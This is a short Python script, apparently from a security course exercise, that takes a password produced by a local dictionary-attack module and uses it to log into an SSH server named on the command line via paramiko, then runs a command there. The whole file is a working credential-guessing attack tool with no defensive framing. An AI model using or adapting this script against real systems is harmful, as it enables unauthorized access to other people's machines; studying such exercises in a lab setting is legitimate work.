#!/usr/bin/env python3

from dictionary import *
from ssh import *
import sys
import paramiko

dict = dictionary()

ssh  = ssh_data("csc2021", "csc2021", 22)
ssh.passwd = dict.attack()

trans = paramiko.Transport((sys.argv[1],  22))
trans.connect(username=ssh.username,  password=ssh.passwd)

client = paramiko.SSHClient()
client._transport = trans

stdin, stdout, stderr = client.exec_command("ls")
print(stdout.read().decode())

client.close()
